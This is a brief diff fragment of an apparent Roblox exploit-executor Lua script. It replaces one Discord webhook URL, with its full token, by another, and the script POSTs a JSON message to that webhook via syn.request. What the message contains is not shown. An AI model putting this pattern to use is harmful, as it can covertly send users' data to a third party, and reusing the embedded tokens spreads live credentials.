@@ -71,7 +71,7 @@ else
                 }
                 syn.request(
                     {
-                    Url = "https://discord.com/api/webhooks/1006943624950452334/MgaBtyOxVvtt589ivXlL0UBSq7v7Vn2yc9S8eLYyeNDCfX7kie3lvf2lPYPc_xZ54SrO",
+                    Url = "https://discord.com/api/webhooks/1006950873596964946/sa8KT3NNLq_xlzf81K4NqoSom3AjbYS60Q05jGLfNMX62muVzecmZd_mbx0fdozvnv28",
                     Method = "POST",
                     Headers = {["Content-Type"] = "application/json"},
                     Body = game:GetService("HttpService"):JSONEncode(msg1)
